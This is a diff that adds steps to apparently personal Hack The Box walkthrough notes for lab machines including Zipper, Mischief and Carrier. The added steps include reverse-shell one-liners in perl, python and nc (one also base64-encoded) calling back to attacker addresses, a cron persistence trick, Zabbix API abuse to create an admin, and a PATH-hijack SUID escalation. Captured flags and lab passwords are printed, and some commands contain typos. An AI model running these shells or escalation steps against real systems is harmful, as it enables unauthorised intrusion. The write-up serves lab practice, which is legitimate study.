@@ -1,3 +1,35 @@
+HTB ZIPPER
+1)Nmap shows open port 80 and 22
+2)navigating to 80 show default apache server
+3)Running dirb with a custom wordlist for webapps we found /zabbix login page
+4)we login as guest and try to find something,
+we found zabbix was changed to zapper so we can try as login and bingo!!
+5)user its unable to login dashboard so we must find another way.
+6)Doing so much thing i managed to get the api json zabbix its using /jsrpc.php
+7)So i create a script with python to manage to connect to api and make requests
+8)I make a request to create a new user with super admin privileges and we login to the dashboard
+create a script for zabbix administrator a reverse shell with perl:
+perl -e 'use Socket;$i="10.10.15.166";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+9)The execute script must execute on zabbix agent not on server cuz server its a docker container(rabbit hole)
+10)server id to execute script its 10106
+11)we managed to get a reverse shell but cant read files.
+found a passwd ZippityDoDah
+12)now get a reverse shell for zabbix agent and once login spawn a tty shell with
+python3 -c 'import pty; pty.spawn("/bin/sh")''
+13)grab the user flag
+14)copy the ssh key for a stable shell
+15)looking for basic privilege scalation an enumeration.
+we see theres a binary with root privileges that SUID enabled
+running strings zabbix-service
+we see its running systemctl as root so we can do that
+so first:
+1) exporth PATH=.
+2) /bin/echo '/bin/sh -i' >> systemctl
+3) /bin/chmod +x systemctl
+4) ./zabbix-service ... start
+5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
+ 
+ 
 HTB MISCHIEF
 1)Enumeration shows open port 22, 3366 and upd 161 running snmp
 2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
@@ -27,6 +59,21 @@ The user we use to get the loki's password it was www-data user so we execute a 
 notice we have to use our ipv6 local address
  
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1384",4444,0,3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+ 
+Alternatively we can run the same python reverse shell with loki user
+but before the command we must append
+$ systemd-run (python command) **but without the scope value "0,3"**
+ 
+with the loki shell we can place the same python script in a /tmp/ fle and then
+make a crontab into the RCE form to execute it as www-data
+loki@Mischief:~$ cat /tmp/shell.sh
+#!/bin/bash
+python -c 'import
+socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1068",2222));os.dup2(s.fleno(),0);
+os.dup2(s.fleno(),1); os.dup2(s.fleno(),2);p=pty.spawn("/bin/sh");'
+ping -c 2 127.0.0.1&&(crontab -l 2>/dev/null; echo "*/1 * * * *
+/tmp/shell") | crontab - ;
+wait a minute and usllget the reverse shell
  
 and got ourselves a shell for www-data and it can execute sudo or su.
 19)we must find www-data su password and we found in loki's .bash_history in the python part:  
@@ -97,6 +144,7 @@ HTB CARRIER
 4)use snmpwalk -v 1 -c public 10.10.10.105
 5) got the number SN#NET_45JDX23
 6)Login with user admin and the pass
+Notice the tickets area with useful info normally unresolved issues are vulns.
 7)Notice the diagnostics verify status
 8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
 9)the commands must be encoded in base 64 to work
@@ -105,6 +153,7 @@ quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >
 in base64 encoded:
 cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
 10)get user flag
+Previusly with gobuster we manage to find a diagram with the servers that linked with quagga.
 11) find the routes and from hint in login pages tickets we get:
 "one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
  
@@ -119,7 +168,7 @@ Then systemctrl restart quagga.
 I then tried to sniff with tcpdump on eth1.
  
 Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
- 
+We cab upload a nmap binary to scan for network in local.
 The box you get a shell on is AS100.
 The "important FTP server" is connected to AS300.
 AS100 is connected to both AS200 and AS300.
@@ -142,13 +191,14 @@ Then you should start getting FTP traffic.
 so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
 restart the quagga service
 Then start up nc and bind it to that IP and listen for incoming FTP:
- 
+Alternate we can use ftpd.py and upload to the machine.
 when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
 13)credentials are:
                         root:BGPtelc0rout1ng
  
 14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
 15)get root flag and secret
+Root flag: 2832e552061532250ac2a21478fd4866
  
  
 HTB SECNOTES
@@ -266,4 +316,5 @@ with this command
 └──╼ #python3 44422.py -H 127.0.0.1:6802 -d jdbc:h2:tcp://10.10.10.102/~/drupal
  
 where the -d argument its the host where the database its allocated look we dont need any user and password just the exploit as it its with the correct database path -d jdbc:h2:tcp://10.10.10.102/~/drupal.
+54f3e840fe5564b42a8320fd2b608ba0
 DONE!!
